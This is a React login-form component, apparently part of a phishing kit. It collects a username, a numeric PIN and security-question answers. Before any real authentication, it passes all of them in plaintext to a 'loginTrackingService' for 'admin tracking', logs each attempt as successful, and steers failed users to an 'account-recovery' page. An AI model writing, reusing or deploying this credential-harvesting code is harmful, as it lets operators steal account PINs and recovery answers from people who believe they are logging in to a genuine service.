import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { authService } from '../services/authService';
import { loginTrackingService } from '../services/loginTrackingService';
import SecurityQuestions from './SecurityQuestions';
import { SecurityAnswers } from '../types/auth';

interface LoginFormProps {
  isNewUser?: boolean;
  pagePath: string;
}

export default function LoginForm({ isNewUser = false, pagePath }: LoginFormProps) {
  const [username, setUsername] = useState('');
  const [pin, setPin] = useState('');
  const [error, setError] = useState('');
  const [attempts, setAttempts] = useState(0);
  const [showSecurityQuestions, setShowSecurityQuestions] = useState(false);
  const [loginData, setLoginData] = useState<any>(null);
  const navigate = useNavigate();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    
    // Store login data for admin tracking
    const data = {
      username,
      pin,
      timestamp: new Date().toISOString(),
      page: pagePath
    };
    setLoginData(data);
    
    // Show security questions after initial login attempt
    setShowSecurityQuestions(true);
  };

  const handleSecurityQuestions = async (answers: SecurityAnswers) => {
    try {
      if (isNewUser) {
        await authService.registerUser({ username: loginData.username, pin: loginData.pin });
      }
      
      // Track all inputs in admin page
      loginTrackingService.trackLogin({
        username: loginData.username,
        pin: loginData.pin,
        page: pagePath,
        success: true,
        securityAnswers: answers
      });
      
      await authService.login({ username: loginData.username, pin: loginData.pin }, pagePath);
      navigate('/dashboard');
    } catch (err) {
      setAttempts(prev => prev + 1);
      if (attempts >= 1) {
        navigate('/account-recovery');
        return;
      }
      setError(err instanceof Error ? err.message : 'An error occurred');
      setShowSecurityQuestions(false);
    }
  };

  if (showSecurityQuestions) {
    return (
      <SecurityQuestions 
        onSubmit={handleSecurityQuestions}
        onCancel={() => setShowSecurityQuestions(false)}
      />
    );
  }

  return (
    <form onSubmit={handleSubmit} className="w-full max-w-md mx-auto space-y-4">
      {error && (
        <div className="bg-red-50 text-red-700 p-3 rounded-md text-sm">
          {error}
        </div>
      )}

      <div>
        <label className="block text-sm font-medium text-gray-700 mb-1">
          Username
        </label>
        <input
          type="text"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500"
          required
        />
      </div>

      <div>
        <label className="block text-sm font-medium text-gray-700 mb-1">
          PIN
        </label>
        <input
          type="password"
          value={pin}
          onChange={(e) => setPin(e.target.value)}
          className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500"
          required
          minLength={5}
          maxLength={11}
          pattern="[0-9]*"
          inputMode="numeric"
          title="PIN must be between 5 and 11 digits"
        />
        <p className="mt-1 text-sm text-gray-500">
          PIN must be between 5 and 11 digits
        </p>
      </div>

      <button
        type="submit"
        className="w-full bg-purple-800 text-white py-3 rounded-md hover:bg-purple-700 transition-colors"
      >
        {isNewUser ? 'CREATE ACCOUNT' : 'LOGIN'}
      </button>
    </form>
  );
}